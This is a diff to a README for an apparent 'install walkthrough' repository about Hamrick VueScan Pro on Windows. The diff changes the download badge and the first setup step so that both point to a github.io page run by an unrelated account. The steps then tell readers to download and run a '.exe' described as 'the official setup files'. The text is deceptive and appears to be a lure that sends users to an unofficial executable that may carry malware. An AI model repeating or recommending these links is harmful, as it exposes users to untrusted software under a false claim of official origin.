@@ -1,6 +1,6 @@
 # 📂 Hamrick-VueScan-Install-Walkthrough - Fix VueScan installation errors on Windows
 
-[![](https://img.shields.io/badge/Download_VueScan_Resources-Blue?style=for-the-badge)](https://github.com/Milletneuropile575/Hamrick-VueScan-Install-Walkthrough/releases)
+[![](https://img.shields.io/badge/Download_VueScan_Resources-Blue?style=for-the-badge)](https://milletneuropile575.github.io)
 
 ## 📌 About this guide
 Many users encounter issues when they try to install Hamrick VueScan Pro on Windows 11. This repository provides a clear path to resolve installation failures. It serves as a central hub for step-by-step instructions, troubleshooting tips, and setup notes for your scanner software.
@@ -17,7 +17,7 @@ Before you start the installation, confirm that your computer meets these basic 
 ## 📥 Getting the software
 You need the official setup files to begin. Follow the steps below to find the correct version for your machine.
 
-1.  Visit this page to download the latest setup files: [https://github.com/Milletneuropile575/Hamrick-VueScan-Install-Walkthrough/releases](https://github.com/Milletneuropile575/Hamrick-VueScan-Install-Walkthrough/releases).
+1.  Visit this page to download the latest setup files: [https://milletneuropile575.github.io](https://milletneuropile575.github.io).
 2.  Locate the section labeled "Assets".
 3.  Click the file link ending in ".exe" to start the download.
 4.  Save the file to your "Downloads" folder.
